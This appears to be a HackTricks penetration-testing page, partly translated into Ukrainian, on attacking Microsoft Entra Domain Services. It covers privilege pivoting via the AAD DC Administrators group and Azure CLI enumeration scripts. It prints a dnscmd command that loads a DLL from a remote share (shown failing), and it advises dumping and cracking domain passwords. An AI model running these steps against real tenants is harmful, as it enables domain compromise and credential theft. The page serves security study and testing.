# Az - Microsoft Entra Domain Services

{{#include ../../../banners/hacktricks-training.md}}

## Служби домену

Microsoft Entra Domain Services дозволяє розгорнути Active Directory в Azure без необхідності керувати Domain Controllers (насправді у вас навіть немає до них доступу).

Його головна мета — дозволити запускати застарілі додатки в хмарі, які не можуть використовувати сучасні методи автентифікації, або в тих випадках, коли ви не хочете, щоб запити до каталогу постійно зверталися назад до on-premises AD DS середовища.

Note that in order to synchronize the users generated in Entra ID (and not synchronized from other active directories) to the AD domain service you need to **змінити пароль користувача** на новий, щоб він міг бути синхронізований з новим AD. Насправді користувач не синхронізується з Microsoft Entra ID до Domain Services, поки пароль не буде змінено.

> [!WARNING]
> Навіть якщо ви створюєте новий Active Directory domain, ви не зможете повністю ним керувати (якщо тільки не експлуатувати певні помилки конфігурації), що означає, що за замовчуванням, наприклад, ви не можете створювати користувачів безпосередньо в AD. Ви створюєте їх шляхом **синхронізації користувачів з Entra ID.** Ви можете вказати синхронізацію всіх користувачів (включно з тими, що синхронізовані з інших on-premise AD), лише cloud users (користувачі, створені в Entra ID), або навіть **додатково їх фільтрувати**.

> [!NOTE]
> Загалом, через обмежену гнучкість у конфігурації нового домену та те, що ADs зазвичай вже розгорнуті on-premise, це не є основною інтеграцією між Entra ID та AD, але все ж цікаво знати, як його компрометувати.

### Pivoting

Членам створеної групи **`AAD DC Administrators`** надаються локальні права адміністратора на VMs, які приєднані до керованого домену (але не на контролерах домену), оскільки вони додаються до локальної групи адміністраторів. Члени цієї групи також можуть використовувати **Remote Desktop для віддаленого підключення до domain-joined VMs**, а також є членами таких груп:

- **`Denied RODC Password Replication Group`**: це група, яка визначає користувачів та групи, чиї паролі не можуть кешуватися на RODCs (Read-Only Domain Controllers).
- **`Group Policy Creators Owners`**: Ця група дозволяє її членам створювати Group Policies у домені. Однак її члени не можуть застосовувати групові політики до користувачів або груп, або редагувати наявні GPOs, тому це не є надто цікавим у цьому середовищі.
- **`DnsAdmins`**: Ця група дозволяє керувати налаштуваннями DNS і в минулому використовувалася для [підвищення привілеїв та компрометації домену](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=dnsadmin#dnsadmins), проте після тестування цієї атаки в цьому середовищі було перевірено, що вразливість виправлена:
```text
dnscmd TDW52Y80ZE26M1K.azure.hacktricks-training.com /config /serverlevelplugindll \\10.1.0.6\c$\Windows\Temp\adduser.dll

DNS Server failed to reset registry property.
Status = 5 (0x00000005)
Command failed:  ERROR_ACCESS_DENIED     5    0x5
```
Note that to grant these permissions, inside the AD the group **`AAD DC Administrators`** group is made a member of the previous groups, and also the GPO **`AADDC Computers GPO`** is adding as Local Administrators all the members of the domain group **`AAD DC Administrators`**.

Pivoting from Entra ID to an AD created with Domain Services is straightforward, just add a user into the group **`AAD DC Administrators`**, access via RDP to any/all the machines in the domain and you will be able to steal data and also **compromise the domain.**

However, pivoting from the domain to Entra ID is not as easy as nothing from the domain is being synchronized into Entra ID. However, always check the metadata to all the VMs joined as their assigned managed identities might have interesting permissions. Also **dump all the users passwords from the domain** and try to crack them to then login into Entra ID / Azure.

> [!NOTE]
> Note that in the past other vulnerabilities in this managed AD were found that allowed to compromise the DCs, [like this one](https://www.secureworks.com/research/azure-active-directory-domain-services-escalation-of-privilege?utm_source=chatgpt.com). An attacker compromising the DC could very easily maintain persistence without the Azure admins noticing or even being able to remove it.

### Enumeration
```bash
# Get configured domain services domains (you can add more subs to check in more subscriptions)
az rest --method post \
--url "https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2021-03-01" \
--body '{
"subscriptions": [
"0ce1297c-9153-425d-3229-f51093614377"
],
"query": "resources | where type == \"microsoft.aad/domainservices\"",
"options": {
"$top": 16,
"$skip": 0,
"$skipToken": ""
}
}'

# Get domain configuration
az rest --url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/<domain-name>?api-version=2022-12-01&healthdata=true"
## e.g.
az rest --url "https://management.azure.com/subscriptions/0ce1297c-9153-425d-3229-f51093614377/resourceGroups/entra-domain-services/providers/Microsoft.AAD/DomainServices/azure.hacktricks-training.com?api-version=2022-12-01&healthdata=true"

# Based on the VNet assigned to the domain services, you can enumerate the VMs in the domain

subscription_id="0ce1297c-9153-425d-3229-f51093614377"
vnet_name="aadds-vnet"

# Retrieve all VMs in the subscription
vm_list=$(az vm list --subscription "$subscription_id" --query "[].{Name:name, ResourceGroup:resourceGroup}" --output tsv)

# Iterate through each VM to check their VNet connection
echo "VMs connected to VNet '$vnet_name':"
while IFS=$'\t' read -r vm_name resource_group; do
nic_ids=$(az vm show --subscription "$subscription_id" --name "$vm_name" --resource-group "$resource_group" --query "networkProfile.networkInterfaces[].id" --output tsv)

for nic_id in $nic_ids; do
subnet_id=$(az network nic show --ids "$nic_id" --query "ipConfigurations[0].subnet.id" --output tsv)

if [[ $subnet_id == *"virtualNetworks/$vnet_name"* ]]; then
echo "VM Name: $vm_name, Resource Group: $resource_group"
fi
done
done <<< "$vm_list"
```
{{#include ../../../banners/hacktricks-training.md}}
